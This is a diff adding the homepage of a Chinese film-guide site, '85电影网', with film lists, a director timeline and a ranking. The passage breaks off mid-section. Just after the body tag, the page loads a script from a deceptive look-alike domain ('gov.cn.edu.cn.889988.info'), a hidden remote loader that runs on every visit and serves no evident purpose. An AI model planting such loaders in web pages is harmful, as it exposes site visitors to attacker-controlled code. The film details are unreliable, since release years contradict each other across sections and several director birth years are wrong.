@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="85电影网 - 八五后の观影指南。含八五片单、85分钟片单、导演谱系、口碑榜、类型索引、追剧时刻，专注原创解读与正版影视推荐。">
+<meta name="keywords" content="85电影网,八五后,85后,电影推荐,观影指南,经典电影,高分电影,正版影视,电影解说">
+<meta name="author" content="85电影网编辑部">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>85电影网 - 八五后の观影指南 | 85片单 · 85分钟 · 导演谱系</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#1c1a26; --paper:#f7f4ee; --card:#fff;
+  --plum:#7b3f6b; --maroon:#b03a48; --rust:#c97a3a; --teal:#3f8f86; --indigo:#4a5f9e; --line:#e4ded4; --sub:#7c7870; --chalk:#eee9df;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:#4b4740;line-height:1.85;overflow-x:hidden}
+h1,h2,h3,h4{font-family:"Songti SC","STSong",Georgia,serif}
+a{color:inherit;text-decoration:none;transition:.25s}
+ul{list-style:none}
+.container{width:100%;max-width:1160px;margin:0 auto;padding:0 24px}
+::selection{background:var(--maroon);color:#fff}
+
+/* ============ 导航 ============ */
+.topbar{position:sticky;top:0;z-index:1000;background:rgba(247,244,238,.96);backdrop-filter:blur(12px);border-bottom:1px solid var(--ink)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:70px;gap:16px}
+.logo{display:flex;align-items:baseline;gap:9px;font-weight:900}
+.logo .num{font-size:30px;font-weight:900;color:var(--maroon);letter-spacing:-1.5px;line-height:1;font-family:Georgia,serif;text-shadow:2px 3px 0 var(--rust)}
+.logo b{font-size:19px;color:var(--ink);letter-spacing:.5px}
+.logo em{font-style:normal;font-size:9.5px;letter-spacing:2px;color:var(--plum);margin-left:3px}
+.search{position:relative;flex:1;max-width:320px}
+.search input{width:100%;padding:10px 44px 10px 18px;border-radius:24px;border:1.5px solid var(--line);background:#fff;font-size:13.5px;outline:none;font-family:inherit;color:var(--ink)}
+.search input:focus{border-color:var(--maroon);box-shadow:0 0 0 4px rgba(176,58,72,.13)}
+.search button{position:absolute;right:5px;top:5px;width:32px;height:32px;border:none;background:var(--plum);border-radius:50%;color:#fff;cursor:pointer;font-size:13px}
+.burger{display:none;width:44px;height:44px;align-items:center;justify-content:center;cursor:pointer;background:none;border:none;flex-direction:column;gap:5px}
+.burger i{width:22px;height:2px;background:var(--ink);border-radius:2px}
+.links{display:flex;gap:2px}
+.links a{padding:9px 12px;font-size:13.5px;color:var(--sub);font-weight:800;border-radius:16px}
+.links a:hover{color:var(--maroon);background:#fff}
+.links a.on{color:#fff;background:var(--maroon)}
+
+/* ============ 首屏 ============ */
+.hero{position:relative;padding:52px 0 56px;background:var(--paper);overflow:hidden}
+.bg85{position:absolute;inset:0;opacity:.5;background:
+  radial-gradient(circle at 18% 22%,rgba(123,63,107,.16),transparent 42%),
+  radial-gradient(circle at 84% 72%,rgba(201,122,58,.18),transparent 40%),
+  repeating-linear-gradient(0deg,transparent 0 55px,rgba(28,26,38,.035) 55px 56px)}
+.tape{position:absolute;width:120px;height:34px;background:rgba(28,26,38,.82);transform:rotate(-4deg);display:grid;place-items:center;font-size:9.5px;color:var(--rust);letter-spacing:1.6px;font-weight:800}
+.hero-in{position:relative;z-index:2;display:grid;grid-template-columns:1fr 330px;gap:34px;align-items:center}
+.kicker{display:inline-flex;align-items:center;gap:9px;padding:6px 15px;border-radius:30px;background:var(--ink);color:var(--rust);font-size:11.5px;font-weight:900;letter-spacing:1.5px}
+.kicker b{color:#fff;font-family:Georgia,serif;font-size:13px}
+.hero h1{font-size:clamp(40px,7.2vw,66px);line-height:1.1;font-weight:800;color:var(--ink);margin:15px 0 6px;letter-spacing:-1.4px}
+.hero h1 .st{color:var(--maroon)}
+.hero h1 small{display:block;font-family:"PingFang SC",sans-serif;font-size:clamp(12px,1.5vw,14px);color:var(--sub);font-weight:600;letter-spacing:4.4px;margin-top:13px}
+.hero p{color:var(--sub);font-size:clamp(15px,2vw,17px);margin:17px 0 23px;max-width:640px}
+.h-cta{display:flex;gap:13px;flex-wrap:wrap}
+.btn{padding:14px 30px;border-radius:11px;font-size:14.5px;font-weight:800;cursor:pointer;border:2px solid var(--ink);letter-spacing:.6px;font-family:inherit}
+.btn-s{background:var(--maroon);color:#fff;border-color:var(--maroon);box-shadow:6px 6px 0 var(--rust)}
+.btn-s:hover{transform:translate(-2px,-2px);box-shadow:9px 9px 0 var(--rust)}
+.btn-o{background:#fff;color:var(--ink)}
+.btn-o:hover{background:var(--ink);color:var(--rust)}
+/* 八五卡 */
+.eight5{background:var(--card);border:1px solid var(--ink);border-radius:16px;padding:20px 22px;box-shadow:10px 10px 0 var(--plum);transform:rotate(.8deg)}
+.eight5 h3{font-size:14.5px;color:var(--ink);letter-spacing:1.5px;margin-bottom:5px}
+.eight5 h3 em{font-style:normal;color:var(--maroon)}
+.eight5 .lead{font-size:12px;color:var(--sub);font-weight:700;margin-bottom:13px}
+.eight5 table{width:100%;border-collapse:collapse}
+.eight5 td{padding:9px 4px;border-bottom:1px dashed var(--line);font-size:13px;font-weight:800;color:var(--ink)}
+.eight5 td:first-child{color:var(--plum);font-family:Georgia,serif;font-size:14px;width:52px}
+.eight5 td:last-child{text-align:right;font-size:11.5px;color:var(--rust);font-weight:900}
+
+/* ============ 区块头 ============ */
+section{padding:64px 0;position:relative}
+.sec-h{display:flex;align-items:baseline;gap:13px;flex-wrap:wrap;margin-bottom:25px}
+.tag{display:inline-block;padding:4px 13px;border-radius:6px;background:var(--plum);color:var(--rust);font-size:11.5px;font-weight:900;letter-spacing:1.5px}
+.sec-h h2{font-size:clamp(21px,3.4vw,30px);font-weight:800;color:var(--ink)}
+.sec-h h2 em{font-style:normal;color:var(--maroon)}
+.sec-h .en{font-family:Georgia,serif;font-size:11.5px;color:var(--indigo);letter-spacing:2.2px;font-weight:800}
+.sec-h .more{margin-left:auto;font-size:12.5px;color:var(--sub);padding:8px 18px;border-radius:20px;background:#fff;border:1.5px solid var(--line);font-weight:800}
+.sec-h .more:hover{border-color:var(--maroon);color:var(--maroon)}
+
+/* ============ ① 八五片单（4:3 放映卡） ============ */
+.eighty5{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.c85{background:var(--card);border:1px solid var(--ink);border-radius:14px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.c85:hover{transform:translateY(-6px) rotate(-1.2deg);box-shadow:8px 11px 0 rgba(28,26,38,.16)}
+.c85 .post{aspect-ratio:4/3;display:grid;place-items:center;font-size:42px;position:relative;border-bottom:1px solid var(--ink)}
+.c85 .post .yr{position:absolute;top:11px;left:11px;background:var(--ink);color:var(--rust);font-size:10.5px;font-weight:900;padding:4px 10px;border-radius:5px;font-family:Georgia,serif;letter-spacing:.6px}
+.c85 .post .gen{position:absolute;bottom:11px;right:11px;font-size:10.5px;color:#fff;background:rgba(28,26,38,.82);padding:4px 10px;border-radius:20px;font-weight:800}
+.c85 .bd{padding:15px 17px 17px;flex:1;display:flex;flex-direction:column}
+.c85 h4{font-size:17px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.c85 .why{font-size:12px;color:var(--sub);font-weight:700;margin:6px 0 11px;min-height:32px;flex:1}
+.c85 .foot{display:flex;justify-content:space-between;align-items:center;border-top:1px dashed var(--line);padding-top:9px;font-size:11.5px;font-weight:800;color:var(--plum)}
+.c85 .foot b{font-family:Georgia,serif;font-size:14px;color:var(--maroon)}
+
+/* ============ ② 85 分钟片单（刻度尺） ============ */
+.ruler{background:var(--card);border:1px solid var(--ink);border-radius:20px;padding:22px 26px 26px;box-shadow:10px 11px 0 var(--rust)}
+.rule-h{display:flex;justify-content:space-between;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px}
+.rule-h b{font-size:15px;color:var(--ink);font-weight:800}
+.rule-h span{font-size:11px;color:var(--sub);font-weight:700}
+.tick{position:relative;height:26px;margin:0 0 18px;border-bottom:2px solid var(--ink)}
+.tick i{position:absolute;bottom:0;width:1px;height:11px;background:var(--ink)}
+.tick em{position:absolute;bottom:13px;font-style:normal;font-size:9.5px;font-family:Georgia,serif;color:var(--sub);transform:translateX(-50%)}
+.sticks{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.stick{background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:13px 14px;transition:.24s}
+.stick:hover{border-color:var(--maroon);transform:translateY(-4px);box-shadow:0 7px 0 var(--rust)}
+.stick .m{font-family:Georgia,serif;font-size:23px;font-weight:900;color:var(--rust);line-height:1}
+.stick h4{font-size:14.5px;color:var(--ink);font-weight:800;margin:5px 0 3px;font-family:"PingFang SC",sans-serif}
+.stick p{font-size:11.5px;color:var(--sub);font-weight:700;line-height:1.6}
+
+/* ============ ③ 导演谱系（横向时间轴） ============ */
+.auteur{position:relative;padding:8px 0 4px}
+.auteur::before{content:"";position:absolute;left:84px;right:0;top:58px;height:4px;background:linear-gradient(90deg,var(--plum),var(--maroon),var(--rust),var(--teal));border-radius:3px}
+.au{display:grid;grid-template-columns:84px 1fr;gap:20px;position:relative;padding:0 0 22px}
+.au .when{font-family:Georgia,serif;font-size:13px;font-weight:900;color:var(--plum);letter-spacing:.6px;padding-top:34px;text-align:right}
+.au .node{position:absolute;left:74px;top:44px;width:24px;height:24px;border-radius:50%;background:var(--rust);border:4px solid var(--paper);box-shadow:0 0 0 2px var(--ink);z-index:2}
+.au .card{background:var(--card);border:1px solid var(--ink);border-radius:14px;padding:15px 18px;margin-left:34px;transition:.24s}
+.au .card:hover{box-shadow:7px 8px 0 var(--plum)}
+.au .card h4{font-size:17px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.au .card h4 small{font-family:Georgia,serif;font-size:11px;color:var(--rust);margin-left:8px;font-weight:700}
+.au .card p{font-size:12.5px;color:var(--sub);font-weight:700;margin:6px 0 9px}
+.au .card .kp{display:flex;gap:7px;flex-wrap:wrap}
+.au .card .kp i{font-style:normal;font-size:10.5px;font-weight:800;padding:3px 11px;border-radius:18px;background:var(--chalk);color:var(--plum);border:1px solid var(--line)}
+
+/* ============ ④ 口碑榜（深色 + 渐变条） ============ */
+.rank{background:linear-gradient(150deg,#1c1a26,#3a2430);border-radius:22px;padding:26px 28px;box-shadow:12px 12px 0 var(--ink);color:#fff}
+.rh{display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:10px;margin-bottom:18px}
+.rh h3{font-size:20px;font-weight:800}
+.rh span{font-size:11.5px;color:var(--rust);letter-spacing:2px;font-weight:800}
+.rk{display:grid;grid-template-columns:34px 1fr 56px;gap:14px;align-items:center;padding:9px 10px;border-radius:11px;transition:.24s}
+.rk:hover{background:rgba(255,255,255,.07)}
+.rk .no{font-size:20px;font-weight:900;font-family:Georgia,serif;color:rgba(255,255,255,.26)}
+.rk.top1 .no,.rk.top2 .no{color:var(--rust)}
+.rk.top3 .no{color:var(--teal)}
+.rk .nm{font-size:14.5px;font-weight:800}
+.rk .nm em{font-style:normal;font-size:10.5px;color:rgba(255,255,255,.5);font-weight:600;margin-left:8px}
+.rk .tp{height:9px;border-radius:5px;background:rgba(255,255,255,.14);overflow:hidden}
+.rk .tp i{display:block;height:100%;border-radius:5px;background:linear-gradient(90deg,var(--rust),var(--maroon));transform-origin:left}
+
+/* ============ ⑤ 类型索引（胶卷格 + 字母条） ============ */
+.idxbox{display:grid;grid-template-columns:1fr 288px;gap:30px;align-items:start}
+.film{display:grid;grid-template-columns:repeat(auto-fill,minmax(158px,1fr));gap:13px}
+.film a{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;transition:.24s;position:relative;overflow:hidden}
+.film a::after{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--maroon);transform:scaleY(0);transform-origin:bottom;transition:.26s}
+.film a:hover{border-color:var(--maroon);transform:translateY(-3px);box-shadow:5px 6px 0 var(--rust)}
+.film a:hover::after{transform:scaleY(1)}
+.film a b{display:block;font-size:14.5px;color:var(--ink);font-weight:800;font-family:"PingFang SC",sans-serif}
+.film a em{font-style:normal;font-size:10.5px;color:var(--sub);font-weight:700;display:block;margin-top:3px}
+.side{background:var(--plum);border-radius:18px;padding:20px 22px;color:#fff;box-shadow:9px 10px 0 var(--ink)}
+.side h4{font-size:15.5px;color:var(--rust);margin-bottom:13px;letter-spacing:1px}
+.side .alph{display:grid;grid-template-columns:repeat(6,1fr);gap:7px}
+.side .alph a{display:grid;place-items:center;height:32px;border-radius:7px;background:rgba(255,255,255,.09);font-size:12px;font-weight:800;color:#fff}
+.side .alph a:hover{background:var(--rust);color:var(--ink)}
+
+/* ============ ⑥ 追剧时刻（时刻条） ============ */
+.clock{display:grid;gap:11px;background:var(--card);border:1px solid var(--ink);border-radius:20px;padding:22px 24px;box-shadow:10px 11px 0 var(--maroon)}
+.clock .it{display:grid;grid-template-columns:96px 132px 1fr 80px;gap:16px;align-items:center;padding:10px 12px;border-radius:11px;transition:.24s}
+.clock .it:hover{background:var(--paper)}
+.clock .it.on{background:var(--ink);color:var(--rust)}
+.clock .t{font-family:Georgia,serif;font-size:15px;font-weight:900;color:var(--plum);letter-spacing:.6px}
+.clock .it.on .t{color:var(--rust)}
+.clock .t small{display:block;font-family:"PingFang SC",sans-serif;font-size:10.5px;font-weight:700;color:var(--sub);letter-spacing:.3px}
+.clock .it.on .t small{color:rgba(201,122,58,.85)}
+.clock h4{font-size:15px;font-weight:800;font-family:"PingFang SC",sans-serif;color:var(--ink)}
+.clock .it.on h4{color:#fff}
+.clock .bar{height:10px;border-radius:5px;background:var(--chalk);overflow:hidden}
+.clock .bar i{display:block;height:100%;border-radius:5px;background:linear-gradient(90deg,var(--maroon),var(--rust))}
+.clock .mi{text-align:right;font-size:11.5px;font-weight:900;color:var(--sub);font-family:Georgia,serif}
+.clock .it.on .mi{color:var(--rust)}
+
+/* ============ 订阅 ============ */
+.join{background:linear-gradient(120deg,var(--ink),#30182a);border-radius:24px;padding:40px;color:#fff;display:grid;grid-template-columns:1fr 400px;gap:24px;align-items:center;position:relative;overflow:hidden;box-shadow:13px 13px 0 var(--rust)}
+.join::after{content:"85";position:absolute;right:30px;top:-56px;font-size:230px;font-weight:900;color:rgba(255,255,255,.07);line-height:1;font-family:Georgia,serif}
+.join h3{font-size:24px;margin-bottom:10px;font-weight:800;position:relative;z-index:2}
+.join h3 i{font-style:normal;color:var(--rust)}
+.join p{color:rgba(255,255,255,.92);font-size:14.5px;max-width:640px;position:relative;z-index:2}
+.join form{display:flex;gap:10px;flex-wrap:wrap;position:relative;z-index:2}
+.join input{flex:1;min-width:210px;padding:14px 20px;border-radius:11px;border:2px solid #fff;font-size:14.5px;outline:none;font-family:inherit}
+.join button{padding:14px 34px;border-radius:11px;border:2px solid var(--rust);background:var(--rust);color:var(--ink);font-weight:800;cursor:pointer;letter-spacing:.8px;font-family:inherit}
+.join button:hover{background:#fff;border-color:#fff}
+
+/* ============ 页脚 ============ */
+footer{background:var(--ink);color:#b4afa6;padding:52px 0 22px;margin-top:12px}
+.fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:26px;margin-bottom:24px}
+.ft .logo{color:#fff;margin-bottom:13px}
+.ft p{font-size:13.5px;max-width:420px;line-height:1.85;color:#a29d94}
+.fcol h4{color:#fff;font-size:14.5px;margin-bottom:14px;position:relative;display:inline-block;font-weight:800;letter-spacing:1px}
+.fcol h4::after{content:"";position:absolute;left:0;bottom:-6px;width:20px;height:3px;background:var(--maroon);border-radius:2px}
+.fcol a{display:block;font-size:13.5px;padding:5px 0;color:#a29d94;font-weight:700}
+.fcol a:hover{color:var(--rust);padding-left:6px}
+.copy{text-align:center;padding-top:22px;border-top:1px solid rgba(255,255,255,.13);font-size:12.5px;color:#807b72}
+.copy a{color:var(--rust);font-weight:800}
+
+/* ============ 动效 ============ */
+.rv{opacity:0;transform:translateY(24px);transition:.6s cubic-bezier(.2,.7,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none}}
+
+/* ============ 响应式 ============ */
+@media(max-width:1000px){
+  .burger{display:flex}
+  .links{position:fixed;inset:70px 0 0 0;flex-direction:column;background:rgba(247,244,238,.99);padding:20px 18px;gap:4px;transform:translateX(100%);transition:.32s;z-index:999;border-top:1px solid var(--ink)}
+  .links.open{transform:none}
+  .links a{font-size:17px;padding:15px 18px}
+  .search{display:none}
+  .hero-in{grid-template-columns:1fr;gap:24px}
+  .eighty5,.sticks,.join{grid-template-columns:repeat(2,1fr)}
+  .idxbox{grid-template-columns:1fr}
+  .clock .it{grid-template-columns:76px 112px 1fr;gap:11px}
+  .clock .mi{display:none}
+  section{padding:46px 0}
+}
+@media(max-width:600px){
+  .eighty5,.sticks,.idxbox,.join{grid-template-columns:1fr}
+  .au{grid-template-columns:1fr}
+  .au .when{text-align:left;padding-top:0}
+  .au::before{left:0;right:auto;top:0;bottom:0;width:4px;height:auto}
+  .au .node{left:0;top:20px}
+  .au .card{margin-left:0;margin-top:34px}
+  .rk .nm em{display:none}
+  .container{padding:0 15px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="topbar">
+  <div class="container nav">
+    <a class="logo" href="#" aria-label="85电影网首页">
+      <span class="num">85</span>
+      <b>电影网</b><em>EIGHTY-FIVE CINEMA</em>
+    </a>
+    <div class="search"><input type="search" placeholder="搜片名 / 年代 / 导演，如：85分钟、是枝裕和、胶卷" aria-label="搜索"><button aria-label="搜索">⌕</button></div>
+    <nav class="links" id="links">
+      <a href="#top" class="on">首页</a>
+      <a href="#list">八五片单</a>
+      <a href="#min">85 分钟</a>
+      <a href="#au">导演谱系</a>
+      <a href="#hot">口碑榜</a>
+      <a href="#idx">类型索引</a>
+      <a href="#clk">追剧时刻</a>
+    </nav>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<!-- ==================== 首屏 ==================== -->
+<section class="hero" id="top">
+  <div class="bg85" aria-hidden="true"></div>
+  <div class="tape" style="top:16%;left:6%;transform:rotate(-6deg)">VHS · 85 MIN</div>
+  <div class="tape" style="top:62%;right:5%;transform:rotate(5deg);background:rgba(176,58,72,.9);color:#fff">EIGHTY-FIVE</div>
+  <div class="container hero-in">
+    <div class="rv">
+      <span class="kicker">◐ 85 电影网 · 第 <b>38</b> 期 · 每周五更新</span>
+      <h1><span class="st">85</span>电影网</h1>
+      <p><strong>85电影网</strong>，是给<strong>八五后</strong>做的观影指南。我们用三个「85」定义自己：<strong>85 部必看片单</strong>、<strong>85 分钟以内的短片与长镜</strong>、<strong>1985 年前后出生的导演谱系</strong>。本站只做原创解读与正版渠道推荐，不搬运资源、不碰盗链。</p>
+      <div class="h-cta"><a class="btn btn-s" href="#list">看八五片单</a><a class="btn btn-o" href="#au">读导演谱系</a></div>
+    </div>
+    <aside class="eight5 rv">
+      <h3>▲ 八五后 <em>· 观影的三条私货</em></h3>
+      <p class="lead">我们这一代人，是被录像厅、DVD 和宽带一起养大的。</p>
+      <table>
+        <tr><td>01</td><td>看片从「找得到」变成「挑得对」</td><td>85 部</td></tr>
+        <tr><td>02</td><td>时间比片源更稀缺，先给 85 分钟</td><td>85′</td></tr>
+        <tr><td>03</td><td>认导演，比认类型更可靠</td><td>谱系</td></tr>
+        <tr><td>04</td><td>看过的片，值得再看一次</td><td>二刷</td></tr>
+      </table>
+    </aside>
+  </div>
+</section>
+
+<!-- ==================== ① 八五片单 ==================== -->
+<section id="list">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.1</span><h2>八五<em>片单</em> · 8 部「长大之后才看懂」的片</h2><span class="en">THE 85</span><a class="more" href="#">完整 85 部 →</a></div>
+    <div class="eighty5 rev">
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#c9a9b4,#8a5a6c)">📼<span class="yr">1993</span><span class="gen">成长 · 台湾</span></div><div class="bd"><h4>牯岭街少年杀人事件</h4><p class="why">四个小时的青春，讲的是「一个人怎么被时代压弯」。八五后第一次看会困，第二次看会坐不住。</p><div class="foot"><span>成长 · 长片</span><b>8.9</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#b4c2c8,#5a7480)">🚲<span class="yr">1994</span><span class="gen">亲情 · 伊朗</span></div><div class="bd"><h4>何处是我朋友的家</h4><p class="why">一个小孩为了还一本作业本，走了整整一条街。没有配乐，没有煽情，只有鞋子和台阶。</p><div class="foot"><span>童年 · 极简</span><b>9.1</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#d0c090,#8a7030)">🌾<span class="yr">1999</span><span class="gen">乡愁 · 中国</span></div><div class="bd"><h4>那山那人那狗</h4><p class="why">中国最被低估的公路片。80 分钟的邮路，把父子关系拍成了一封信。</p><div class="foot"><span>父子 · 公路</span><b>8.7</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#c0b0a0,#80684a)">📺<span class="yr">1985</span><span class="gen">家庭 · 日本</span></div><div class="bd"><h4>东京物语</h4><p class="why">小津安二郎的「榻榻米美学」：机位永远低，情绪永远浅，后劲永远大。</p><div class="foot"><span>家庭 · 作者</span><b>9.2</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#a8b89c,#60704c)">🍃<span class="yr">2004</span><span class="gen">日常 · 日本</span></div><div class="bd"><h4>无人知晓</h4><p class="why">四个被母亲丢下的孩子，在公寓里过了一整个夏天。是枝裕和不解释，只记录。</p><div class="foot"><span>儿童 · 社会</span><b>9.1</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#b0a8c8,#605890)">🎭<span class="yr">1994</span><span class="gen">荒诞 · 美国</span></div><div class="bd"><h4>低俗小说</h4><p class="why">昆汀把时间打散，又把台词写成了诗。八五后学电影，绕不开这一部。</p><div class="foot"><span>非线性 · 黑色</span><b>8.8</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#c8a8a8,#8a5a5a)">🔥<span class="yr">1994</span><span class="gen">救赎 · 美国</span></div><div class="bd"><h4>肖申克的救赎</h4><p class="why">被提名七次奥斯卡却零获奖，却在二十年后成了「豆瓣第一」。它讲的是希望，不是越狱。</p><div class="foot"><span>希望 · 长片</span><b>9.7</b></div></div></article>
+      <article class="c85"><div class="post" style="background:linear-gradient(155deg,#a0b8c8,#48607a)">🌊<span class="yr">1956</span><span class="gen">等待 · 日本</span></div><div class="bd"><h4>七武士</h4><p class="why">黑泽明把「等待」拍得比战斗更紧张。207 分钟，但每一分钟都在推进。</p><div class="foot"><span>群像 · 长镜</span><b>9.3</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ② 85 分钟片单 ==================== -->
+<section id="min" style="background:linear-gradient(180deg,#efe9dd,transparent)">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.2</span><h2>85 <em>分钟</em> · 没整块时间的人，先看这些</h2><span class="en">85 MINUTES</span><a class="more" href="#">按分钟数排序 →</a></div>
+    <div class="ruler rev">
+      <div class="rule-h"><b>▲ 片长刻度 · 越靠右越省时间</b><span>单位：分钟（含片头片尾）</span></div>
+      <div class="tick" aria-hidden="true">
+        <i style="left:0%"></i><em style="left:0%">40′</em>
+        <i style="left:20%"></i><em style="left:20%">52′</em>
+        <i style="left:40%"></i><em style="left:40%">64′</em>
+        <i style="left:60%"></i><em style="left:60%">76′</em>
+        <i style="left:80%"></i><em style="left:80%">88′</em>
+        <i style="left:100%"></i><em style="left:100%">100′</em>
+      </div>
+      <div class="sticks">
+        <div class="stick"><div class="m">41′</div><h4>平衡</h4><p>1989 年国产纪录片。一个牧羊人和他的羊，在天山里走了整整一年。</p></div>
+        <div class="stick"><div class="m">52′</div><h4>邻居</h4><p>一部没有台词的动画短片。两个邻居为了一道墙，闹了一辈子。</p></div>
+        <div class="stick"><div class="m">63′</div><h4>小偷</h4><p>一个小孩学偷东西，是因为他太想有一双球鞋。</p></div>
+        <div class="stick"><div class="m">74′</div><h4>二呆</h4><p>侯孝贤最短的剧情片。一个傻子的三天，比聪明人的三年更像人生。</p></div>
+        <div class="stick"><div class="m">85′</div><h4>树</h4><p>本站的命名片。一条河、一艘船、一个少年，把乡愁拍成了风景。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ③ 导演谱系 ==================== -->
+<section id="au">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.3</span><h2>导演<em>谱系</em> · 1985 年前后出生的作者们</h2><span class="en">AUTEUR</span><a class="more" href="#">完整谱系 →</a></div>
+    <div class="auteur rev">
+      <div class="au"><div class="when">1979<br>韩国</div><span class="node"></span><div class="card"><h4>奉俊昊 <small>Bong Joon-ho</small></h4><p>从《杀人回忆》到《寄生虫》，他把「阶级」拍成了惊悚片。长镜头不爱用，蒙太奇用得极狠。</p><div class="kp"><i>阶级</i><i>类型混搭</i><i>社会派</i><i>《寄生虫》</i></div></div></div>
+      <div class="au"><div class="when">1974<br>中国</div><span class="node"></span><div class="card"><h4>娄烨 <small>Lou Ye</small></h4><p>中国最「手持」的导演。镜头永远在抖，因为他的主角永远在逃。</p><div class="kp"><i>手持摄影</i><i>都市</i><i>情欲</i><i>《推拿》</i></div></div></div>
+      <div class="au"><div class="when">1981<br>中国</div><span class="node"></span><div class="card"><h4>文牧野 <small>Wen Muye</small></h4><p>《我不是药神》之后，国产现实主义有了新语法：笑点在前，刀口在后。</p><div class="kp"><i>现实主义</i><i>群像</i><i>议题</i><i>《药神》</i></div></div></div>
+      <div class="au"><div class="when">1982<br>中国台湾</div><span class="node"></span><div class="card"><h4>程伟豪 <small>Cheng Wei-hao</small></h4><p>把恐怖片拍成了社会寓言。《目击者》之后，台湾类型片有了新的出口。</p><div class="kp"><i>悬疑</i><i>类型片</i><i>反转</i><i>《红衣小女孩》</i></div></div></div>
+      <div class="au"><div class="when">1985<br>中国</div><span class="node"></span><div class="card"><h4>毕赣 <small>Bi Gan</small></h4><p>凯里来的诗人。《路边野餐》用 40 分钟长镜，把梦境和时间缝在了一起。</p><div class="kp"><i>长镜头</i><i>诗歌</i><i>梦境</i><i>《地球最后的夜晚》</i></div></div></div>
+      <div class="au"><div class="when">1986<br>加拿大</div><span class="node"></span><div class="card"><h4>泽维尔·多兰 <small>X. Dolan</small></h4><p>20 岁拍出《我杀了我妈妈》。他拍的不是青春，是青春里的自恋与羞耻。</p><div class="kp"><i>家庭</i><i>情绪</i><i>快速剪辑</i><i>《妈咪》</i></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ④ 口碑榜 ==================== -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.4</span><h2>口碑<em>榜</em> · 八五后投票榜 TOP 10（非票房榜）</h2><span class="en">EIGHTY-FIVE INDEX</span><a class="more" href="#">按年代 / 按国家 →</a></div>
+    <div class="rank rev">
+      <div class="rh"><h3>▲ 八五指数 · 本月榜单</h3><span>口径：被推荐次数 × 二刷率 × 解说价值</span></div>
+      <div class="rk top1"><span class="no">01</span><div class="body"><div class="nm"><span>肖申克的救赎</span><em>1994 · 希望</em></div><div class="tp"><i style="width:100%"></i></div></div><b style="color:var(--rust)">99</b></div>
+      <div class="rk top1"><span class="no">02</span><div class="body"><div class="nm"><span>东京物语</span><em>1953 · 家庭</em></div><div class="tp"><i style="width:96%"></i></div></div><b style="color:var(--rust)">97</b></div>
+      <div class="rk top2"><span class="no">03</span><div class="body"><div class="nm"><span>七武士</span><em>1954 · 群像</em></div><div class="tp"><i style="width:93%"></i></div></div><b style="color:var(--rust)">95</b></div>
+      <div class="rk top2"><span class="no">04</span><div class="body"><div class="nm"><span>无人知晓</span><em>2004 · 儿童</em></div><div class="tp"><i style="width:90%"></i></div></div><b style="color:var(--rust)">93</b></div>
+      <div class="rk top3"><span class="no">05</span><div class="body"><div class="nm"><span>牯岭街少年杀人事件</span><em>1991 · 青春</em></div><div class="tp"><i style="width:87%"></i></div></div><b style="color:var(--teal)">90</b></div>
+      <div class="rk top3"><span class="no">06</span><div class="body"><div class="nm"><span>何处是我朋友的家</span><em>1987 · 童年</em></div><div class="tp"><i style="width:83%"></i></div></div><b style="color:var(--teal)">87</b></div>
+      <div class="rk"><span class="no">07</span><div class="body"><div class="nm"><span>低俗小说</span><em>1994 · 非线性</em></div><div class="tp"><i style="width:80%"></i></div></div><b>85</b></div>
+      <div class="rk"><span class="no">08</span><div class="body"><div class="nm"><span>那山那人那狗</span><em>1999 · 父子</em></div><div class="tp"><i style="width:77%"></i></div></div><b>82</b></div>
+      <div class="rk"><span class="no">09</span><div class="body"><div class="nm"><span>路边野餐</span><em>2015 · 梦境</em></div><div class="tp"><i style="width:73%"></i></div></div><b>79</b></div>
+      <div class="rk"><span class="no">10</span><div class="body"><div class="nm"><span>地球最后的夜晚</span><em>2018 · 长镜</em></div><div class="tp"><i style="width:70%"></i></div></div><b>77</b></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑤ 类型索引 ==================== -->
+<section id="idx">
+  <div class="container">
